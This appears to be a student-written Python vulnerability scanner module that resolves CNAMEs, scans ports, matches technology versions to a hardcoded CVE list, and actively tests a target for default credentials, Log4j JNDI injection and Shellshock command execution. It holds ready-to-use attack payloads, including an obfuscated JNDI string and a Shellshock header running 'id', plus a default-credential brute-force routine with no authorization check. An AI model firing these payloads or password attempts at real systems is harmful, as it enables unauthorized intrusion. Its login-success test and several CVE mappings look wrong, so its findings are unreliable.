#!/usr/bin/env python3
"""
Advanced Recon Module - CNAME, Port Scanning, CVE Detection, Security Checks
Authors: IAIICT PROJECT DCT PROJECT GROUP 10
"""

import socket
import dns.resolver
import requests
import json
import re
import ssl
import hashlib
from datetime import datetime
from colorama import Fore, Style
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

class AdvancedRecon:
    """Advanced reconnaissance with CNAME, Ports, CVEs, Security Checks"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'CyberHawk-Recon/3.0'}
        
        # CVE Database (simplified - would normally query NVD API)
        self.cve_database = {
            'nginx': {
                '1.14.0': ['CVE-2019-9511', 'CVE-2019-9513'],
                '1.16.0': ['CVE-2019-20372'],
                '1.18.0': ['CVE-2021-23017']
            },
            'apache': {
                '2.4.41': ['CVE-2020-1938', 'CVE-2019-10098'],
                '2.4.46': ['CVE-2020-11984', 'CVE-2020-11993']
            },
            'wordpress': {
                '5.0': ['CVE-2019-8942', 'CVE-2019-8943'],
                '5.5': ['CVE-2020-28032', 'CVE-2020-28035']
            },
            'php': {
                '7.2.0': ['CVE-2019-11043', 'CVE-2019-11044'],
                '7.4.0': ['CVE-2020-7060', 'CVE-2020-7061']
            },
            'node': {
                '12.0.0': ['CVE-2019-15513', 'CVE-2019-15514'],
                '14.0.0': ['CVE-2020-15095', 'CVE-2020-8203']
            },
            'mysql': {
                '5.7.0': ['CVE-2020-28198', 'CVE-2020-28199'],
                '8.0.0': ['CVE-2020-15180', 'CVE-2020-15181']
            }
        }
        
        # Default credentials database
        self.default_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('root', 'root'), ('root', 'toor'), ('root', 'password'),
            ('administrator', 'administrator'), ('administrator', 'password'),
            ('user', 'user'), ('user', 'password'), ('guest', 'guest'),
            ('test', 'test'), ('test', 'password'), ('demo', 'demo'),
            ('wp-admin', 'wp-admin'), ('admin', '12345'), ('admin', '1234')
        ]
        
        # Log4j test patterns
        self.log4j_payloads = [
            '${jndi:ldap://test.com/a}',
            '${jndi:rmi://test.com/a}',
            '${jndi:dns://test.com}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://test.com}'
        ]
        
        # Shellshock test patterns
        self.shellshock_payloads = [
            '() { :;}; echo vulnerable',
            '() { :;}; /bin/bash -c "id"',
            '() { :;}; ping -c 1 test.com'
        ]
    
    def resolve_cname(self, domain):
        """Resolve CNAME records to find CDN providers"""
        cname_records = []
        cdn_providers = {
            'cloudflare': ['cloudflare.com', 'cdn.cloudflare.net'],
            'akamai': ['akamai.net', 'akamaihd.net', 'edgesuite.net'],
            'fastly': ['fastly.net', 'fastly.com'],
            'cloudfront': ['cloudfront.net', 'amazonaws.com'],
            'azure': ['azureedge.net', 'azurewebsites.net', 'cloudapp.net'],
            'google': ['googleapis.com', 'appspot.com'],
            'incapsula': ['incapsec.org', 'incapsula.net'],
            'sucuri': ['sucuri.net', 'sucuri.com'],
            'stackpath': ['stackpath.com', 'highwinds.net']
        }
        
        try:
            answers = dns.resolver.resolve(domain, 'CNAME')
            for answer in answers:
                target = str(answer.target).rstrip('.')
                cname_records.append(target)
                
                # Check if CNAME points to CDN
                for cdn, patterns in cdn_providers.items():
                    for pattern in patterns:
                        if pattern in target.lower():
                            return {
                                'has_cname': True,
                                'cname': target,
                                'cdn_provider': cdn.upper(),
                                'is_cdn': True
                            }
        except:
            pass
        
        return {'has_cname': len(cname_records) > 0, 'cname': cname_records[0] if cname_records else None, 'is_cdn': False}
    
    def port_scan_ips(self, ips, ports=None):
        """Scan ports on discovered IP addresses"""
        if not ports:
            ports = [80, 443, 22, 21, 25, 3306, 5432, 6379, 27017, 8080, 8443, 3389, 5900]
        
        services = {
            80: 'HTTP', 443: 'HTTPS', 22: 'SSH', 21: 'FTP', 25: 'SMTP',
            3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis', 27017: 'MongoDB',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 3389: 'RDP', 5900: 'VNC'
        }
        
        results = {}
        
        for ip in ips[:10]:  # Limit to first 10 IPs
            open_ports = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    if sock.connect_ex((ip, port)) == 0:
                        open_ports.append({
                            'port': port,
                            'service': services.get(port, 'Unknown'),
                            'state': 'open'
                        })
                    sock.close()
                except:
                    pass
            if open_ports:
                results[ip] = open_ports
        
        return results
    
    def check_cves(self, tech_stack):
        """Check for CVEs based on detected technology versions"""
        cves_found = []
        
        for tech in tech_stack:
            for known_tech, versions in self.cve_database.items():
                if known_tech in tech.lower():
                    for version, cves in versions.items():
                        if version in tech:
                            for cve in cves:
                                cves_found.append({
                                    'technology': known_tech,
                                    'version': version,
                                    'cve': cve,
                                    'severity': 'HIGH',
                                    'url': f"https://nvd.nist.gov/vuln/detail/{cve}"
                                })
        
        # Also check via NVD API (if available)
        try:
            for tech in tech_stack:
                # Query NVD API for known vulnerabilities
                url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    for vuln in data.get('vulnerabilities', [])[:5]:
                        cves_found.append({
                            'technology': tech,
                            'version': 'Unknown',
                            'cve': vuln.get('cve', {}).get('id', 'Unknown'),
                            'severity': vuln.get('cve', {}).get('metrics', {}).get('cvssMetricV31', [{}])[0].get('cvssData', {}).get('baseSeverity', 'MEDIUM'),
                            'url': f"https://nvd.nist.gov/vuln/detail/{vuln.get('cve', {}).get('id', '')}"
                        })
        except:
            pass
        
        return cves_found
    
    def check_default_creds(self, url):
        """Test for default credentials on login panels"""
        results = []
        
        login_paths = ['/admin', '/login', '/wp-admin', '/administrator', '/cpanel', '/dashboard', '/console', '/user/login']
        
        for path in login_paths:
            full_url = f"{url}{path}"
            try:
                # Check if login page exists
                resp = self.session.get(full_url, timeout=5, verify=False)
                if resp.status_code == 200:
                    # Try default credentials
                    for username, password in self.default_creds:
                        try:
                            login_resp = self.session.post(full_url, data={
                                'username': username,
                                'password': password,
                                'user': username,
                                'pass': password,
                                'login': 'Login',
                                'submit': 'Login'
                            }, timeout=5, verify=False)
                            
                            # Check if login successful (no login form again)
                            if 'login' not in login_resp.text.lower() or 'invalid' not in login_resp.text.lower():
                                results.append({
                                    'url': full_url,
                                    'username': username,
                                    'password': password,
                                    'status': 'DEFAULT CREDENTIALS WORKING!'
                                })
                                print(f"{Fore.RED}[!] DEFAULT CREDS: {username}:{password} on {full_url}{Style.RESET_ALL}")
                        except:
                            pass
            except:
                pass
        
        return results
    
    def check_log4j(self, url):
        """Test for Log4j vulnerability (CVE-2021-44228)"""
        results = []
        
        # Test parameters that might be vulnerable
        test_params = ['q', 'search', 'query', 'id', 'user', 'username', 'email', 'name', 'callback', 'cb']
        
        # Also test headers
        test_headers = ['User-Agent', 'X-Forwarded-For', 'Referer', 'Origin']
        
        for param in test_params:
            for payload in self.log4j_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    resp = self.session.get(test_url, timeout=5, verify=False)
                    
                    # Check for Log4j indicators
                    if 'lookup' in resp.text.lower() or 'jndi' in resp.text.lower() or 'error' in resp.text.lower():
                        results.append({
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'vulnerability': 'Log4j (CVE-2021-44228)',
                            'severity': 'CRITICAL'
                        })
                        print(f"{Fore.RED}[!] LOG4J VULNERABILITY: {test_url}{Style.RESET_ALL}")
                except:
                    pass
        
        # Test headers
        for header in test_headers:
            for payload in self.log4j_payloads:
                try:
                    headers = {header: payload}
                    resp = self.session.get(url, headers=headers, timeout=5, verify=False)
                    
                    if 'lookup' in resp.text.lower() or 'jndi' in resp.text.lower():
                        results.append({
                            'url': url,
                            'header': header,
                            'payload': payload,
                            'vulnerability': 'Log4j (CVE-2021-44228)',
                            'severity': 'CRITICAL'
                        })
                except:
                    pass
        
        return results
    
    def check_shellshock(self, url):
        """Test for Shellshock vulnerability (CVE-2014-6271)"""
        results = []
        
        for payload in self.shellshock_payloads:
            try:
                headers = {'User-Agent': payload}
                resp = self.session.get(url, headers=headers, timeout=5, verify=False)
                
                # Check for command execution indicators
                if 'uid=' in resp.text or 'gid=' in resp.text or 'groups=' in resp.text:
                    results.append({
                        'url': url,
                        'payload': payload,
                        'vulnerability': 'Shellshock (CVE-2014-6271)',
                        'severity': 'CRITICAL'
                    })
                    print(f"{Fore.RED}[!] SHELLSHOCK VULNERABILITY: {url}{Style.RESET_ALL}")
            except:
                pass
        
        return results
    
    def check_misconfigurations(self, url):
        """Check for security misconfigurations"""
        misconfigs = []
        
        # Check for missing security headers
        try:
            resp = self.session.get(url, timeout=5, verify=False)
            headers = resp.headers
            
            security_headers = {
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-Frame-Options': 'Clickjacking Protection',
                'X-Content-Type-Options': 'MIME Sniffing Protection',
                'Referrer-Policy': 'Referrer Policy',
                'X-XSS-Protection': 'XSS Protection'
            }
            
            missing = []
            for header, name in security_headers.items():
                if header not in headers:
                    missing.append(name)
            
            if missing:
                misconfigs.append({
                    'type': 'Missing Security Headers',
                    'details': f"Missing: {', '.join(missing)}",
                    'severity': 'MEDIUM'
                })
        except:
            pass
        
        # Check for directory listing
        test_paths = ['/images/', '/uploads/', '/assets/', '/files/', '/backup/']
        for path in test_paths:
            try:
                test_url = f"{url}{path}"
                resp = self.session.get(test_url, timeout=5, verify=False)
                if 'Index of' in resp.text or 'Directory listing' in resp.text:
                    misconfigs.append({
                        'type': 'Directory Listing Enabled',
                        'url': test_url,
                        'severity': 'HIGH'
                    })
                    print(f"{Fore.YELLOW}[!] Directory listing: {test_url}{Style.RESET_ALL}")
            except:
                pass
        
        # Check for exposed .git
        try:
            test_url = f"{url}/.git/config"
            resp = self.session.get(test_url, timeout=5, verify=False)
            if resp.status_code == 200 and 'repositoryformatversion' in resp.text:
                misconfigs.append({
                    'type': 'Exposed Git Repository',
                    'url': test_url,
                    'severity': 'CRITICAL'
                })
                print(f"{Fore.RED}[!] Exposed .git: {test_url}{Style.RESET_ALL}")
        except:
            pass
        
        # Check for exposed .env
        try:
            test_url = f"{url}/.env"
            resp = self.session.get(test_url, timeout=5, verify=False)
            if resp.status_code == 200 and ('DB_' in resp.text or 'KEY=' in resp.text or 'SECRET' in resp.text):
                misconfigs.append({
                    'type': 'Exposed Environment File',
                    'url': test_url,
                    'severity': 'CRITICAL'
                })
                print(f"{Fore.RED}[!] Exposed .env: {test_url}{Style.RESET_ALL}")
        except:
            pass
        
        return misconfigs
    
    def comprehensive_scan(self, target, ips, tech_stack):
        """Run all advanced scans"""
        results = {}
        
        # 1. CNAME Resolution
        print(f"\n{Fore.BLUE}[*] CNAME Resolution & CDN Detection...{Style.RESET_ALL}")
        cname_result = self.resolve_cname(target)
        results['cname'] = cname_result
        if cname_result.get('is_cdn'):
            print(f"{Fore.GREEN}    └── CDN Detected: {cname_result['cdn_provider']}{Style.RESET_ALL}")
        elif cname_result.get('has_cname'):
            print(f"{Fore.CYAN}    └── CNAME: {cname_result['cname']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}    └── No CNAME records found{Style.RESET_ALL}")
        
        # 2. Port Scanning on discovered IPs
        if ips:
            print(f"\n{Fore.BLUE}[*] Port Scanning on {len(ips)} IPs...{Style.RESET_ALL}")
            port_results = self.port_scan_ips(ips)
            results['port_scans'] = port_results
            for ip, ports in port_results.items():
                print(f"{Fore.GREEN}    └── {ip}: {len(ports)} open ports{Style.RESET_ALL}")
                for p in ports[:5]:
                    print(f"{Fore.CYAN}        • Port {p['port']}: {p['service']}{Style.RESET_ALL}")
        
        # 3. CVE Detection
        if tech_stack:
            print(f"\n{Fore.BLUE}[*] CVE Detection...{Style.RESET_ALL}")
            cves = self.check_cves(tech_stack)
            results['cves'] = cves
            for cve in cves[:10]:
                print(f"{Fore.RED}    └── {cve['cve']} - {cve['technology']} {cve['version']}{Style.RESET_ALL}")
        
        # 4-7. Vulnerability tests on main domain
        base_url = f"https://{target}"
        
        print(f"\n{Fore.BLUE}[*] Default Credential Scanning...{Style.RESET_ALL}")
        cred_results = self.check_default_creds(base_url)
        results['default_creds'] = cred_results
        
        print(f"\n{Fore.BLUE}[*] Log4j Vulnerability Check...{Style.RESET_ALL}")
        log4j_results = self.check_log4j(base_url)
        results['log4j'] = log4j_results
        
        print(f"\n{Fore.BLUE}[*] Shellshock Vulnerability Check...{Style.RESET_ALL}")
        shellshock_results = self.check_shellshock(base_url)
        results['shellshock'] = shellshock_results
        
        print(f"\n{Fore.BLUE}[*] Security Misconfiguration Check...{Style.RESET_ALL}")
        misconfigs = self.check_misconfigurations(base_url)
        results['misconfigurations'] = misconfigs
        
        # Summary
        total_vulns = len(cves) + len(cred_results) + len(log4j_results) + len(shellshock_results) + len(misconfigs)
        print(f"\n{Fore.CYAN}─────────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Advanced Scan Complete! Found {total_vulns} potential issues{Style.RESET_ALL}")
        
        return results
